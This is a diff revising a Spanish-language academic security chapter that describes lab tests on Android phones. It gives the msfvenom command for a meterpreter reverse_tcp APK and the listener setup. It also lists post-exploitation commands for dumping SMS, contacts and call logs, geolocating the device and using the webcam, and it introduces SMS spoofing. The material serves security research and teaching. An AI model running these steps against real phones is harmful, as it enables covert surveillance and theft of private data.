@@ -35,16 +35,16 @@ En esta primer prueba se pretende tener acceso a una herramienta profesional par
 
 4.3.1.2 Procedimiento
 
-Los pasos que se van a seguir se los pueden reunir en 2 grupos: la generación del exploit (en una PC) y la activación del exploit (en un smartphone); cada grupo de comandos se va a ejecutar en 2 consolas separadas y en ese orden. El primer grupo de comandos contribuyen en la generación de un archivo que contiene código malicioso (payload). El segundo grupo contribuyen en la ejecución del exploit en el smartphone víctima, que permite la conexión con la víctima cuando éste usa el exploit.
+Los pasos que se van a seguir se los puede dividir en 2 etapas, siguiendo este orden: la generación del exploit (en una PC) y la activación del exploit (en un smartphone). La primer etapa consiste en la generación de un archivo que contiene código malicioso (payload). La segunda etapa consiste en la ejecución del exploit en el smartphone víctima, que permite la conexión con la víctima cuando éste ejecuta el exploit.
 El archivo que se genera, es un instalador de una aplicación Android (lleva la extensión .apk), el cual actúa como un exploit con el objetivo de tener acceso a información privada del sistema víctima. Ésto se logra cuando se activa el exploit, se puede obtener información privada con la ejecución de comandos, como acceder al filesystem o acceder al log de llamadas hechas con el celular. Cuando se ejecuta el exploit desde el smartphone víctima, queda corriendo en segundo plano a la espera de órdenes de un host controlado por el atacante.
 
-CONSOLA 1
+ETAPA 1
 // En una consola y en modo superusuario se deben ejecutar los siguientes comandos (uno a la vez):
 # ifconfig
 // Este comando retorna varios parámetros agrupados por interfase de red. En el grupo relativo a la conexión inalámbrica (wlan0), se obtiene la IP de la máquina actual (con el formato X.X.X.X) el cual nos sirve como parámetro para el próximo comando:
 # msfvenom -p android/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8080 R > exploit.apk
 
-CONSOLA 2
+ETAPA 2
 // En otra consola y en modo superusuario se deben ejecutar los siguientes comandos (uno a la vez):
 msfconsole
 use multi/handler
@@ -57,14 +57,9 @@ meterpreter >
 
 4.3.1.3 Observaciones
 
-Cuando se activó el exploit en el smartphone y la PC respondió, habilitó la ejecución de comandos de forma remota, algunos de ellos no devolvían los resultados que se esperaban.
-Se logró conectar y activar la línea de comandos interna al smartphone (la cual permite acceder a la información inherente al smartphone de forma remota), para cada uno de los 3 smartphones. Una vez que se consigue este ingreso, se pueden usar varios comandos para manipular el contenido del smartphone, sin embargo, para esta prueba, no todos estos comandos funcionaron de la forma esperada. Algunos comandos devolvían mensajes de error con los 3 smartphones.
+Se logró una conexión con una línea de comandos remota, en el contexto de cada smartphone (la cual permite acceder a la información dentro del smartphone). Una vez que se consigue este ingreso, se pueden usar varios comandos para manipular el contenido del smartphone, sin embargo, no todos estos comandos funcionaron de la forma esperada.
 
-{ REALIZAR PRUEBAS ADICIONALES }
-
-En base a esta demostración, se obtuvieron las siguientes conclusiones. Una de ellas, es que se puede generar fácilmente un exploit que obtenga acceso a un smartphone, sin el consentimiento del usuario. Otra conclusión es que esta técnica se puede mejorar con la ayuda de la ingeniería social, de forma tal que se pueda inducir a un usuario (víctima) a instalar el exploit en su celular, haciéndole creer que es un software benigno. Cabe aclarar que esta prueba se aplica específicamente a la plataforma Android.
-
-Estos son los comandos relevantes que se probaron una vez dentro de alguno de los 3 smartphones (obtenidos a partir del comando "help"):
+Estos son los comandos mas relevantes que se probaron una vez dentro de alguno de los 3 smartphones (obtenidos a partir del comando "help"):
 
 Comando		Descripción 													
 cat 		Lee el contenido de un archivo y lo muestra en la pantalla
@@ -93,15 +88,23 @@ dump_contacts	Descarga en un archivo todos los contactos
 dump_sms		Descarga en un archivo todos los SMS
 geolocate		Obtiene la ubicación geográfica actual
 
-Durante la prueba, sucedieron 2 situaciones anómalas. Por un lado, a veces la sesión de la shell conectada al smartphone se cerraba sola luego de pasado un tiempo. Por otro lado, en la ejecución de algunos comandos, después de haber hecho una espera de 20 segundos aproximadamente, se recibía este mensaje de error:
+En esta prueba no todo salió como se esperaba, hubieron imperfecciones. Durante las pruebas con estos comandos en cada smartphone, sucedieron varias situaciones anómalas:
+- A veces la sesión de la shell conectada al smartphone se cerraba inesperadamente luego de haber pasado cierto tiempo.
+- En ocasiones, fallaban los comandos cuando se ejecutaban, porque después de haber hecho una espera de 20 segundos aproximadamente después de ejecutar uno, se recibía este mensaje de error (en el caso del comando "webcam_snap"):
 [-] Error running command webcam_snap: Rex::TimeoutError Operation timed out.
+- Se notó cierta inestabilidad en la interacción con la shell: a veces los comandos fallaban, pero cuando se volvían a ejecutar, funcionaban.
+- Algunos comandos funcionaban cuando se los invocaban sin parámetros (ésto sucedió con los comandos "dump_calllog", "dump_contacts" y "dump_sms"), de lo contrario surgía un error como:
+[-] Error getting call log: no implicit conversion of nil into String
+- El comando webcam_stream mostró un video en tiempo real en un navegador que tenía una tasa de refresco muy lenta.
+- El comando webcam_snap pudo funcionar después de que se ejecutara webcam_stream.
 
+En base a esta demostración, se obtuvieron las siguientes conclusiones. Una de ellas, es que se puede generar fácilmente un exploit que obtenga acceso a un smartphone, sin el consentimiento del usuario. Otra conclusión que se consiguió es que esta técnica se puede mejorar con la ayuda de la ingeniería social, de forma tal que se pueda inducir a un usuario (víctima) a instalar el exploit en su celular. Cabe aclarar que esta prueba se aplica específicamente a la plataforma Android.
 
 4.3.2 Segunda prueba
 
 4.3.2.1 Introducción
 
-En el capítulo 1 (sección 1.5.4.4) se explicó la técnica de SMS Spoofing; en la siguiente prueba se va a demostrar que esta técnica se puede aplicar. Para realizar esta prueba se emplea un servicio ofrecido por una empresa llamada "DiGiMessaging", este servicio permite omitir los detalles de implementación de la técnica, de éso se encarga la empresa. Concretamente, el servicio permite enviar SMSs desde la Web con un caller ID arbitrario. En este caso, se va a utilizar la prueba gratuita, la cual impone una restricción en el envío de SMSs: solo se pueden enviar 3 mensajes SMS por cada cuenta gratuita.
+En el capítulo 1 se explicó la técnica de SMS Spoofing, en la siguiente prueba se va a demostrar que esta técnica es factible. Para realizar esta prueba se emplea un servicio ofrecido por una empresa llamada "DiGiMessaging", este servicio permite omitir los detalles de implementación de la técnica. El servicio permite enviar SMSs desde la Web con un caller ID arbitrario. En este caso, se va a utilizar la prueba gratuita, la cual impone una restricción en el envío de SMSs: solo se pueden enviar 3 mensajes SMS por cada cuenta gratuita.
 
 4.3.2.2 Procedimiento
 
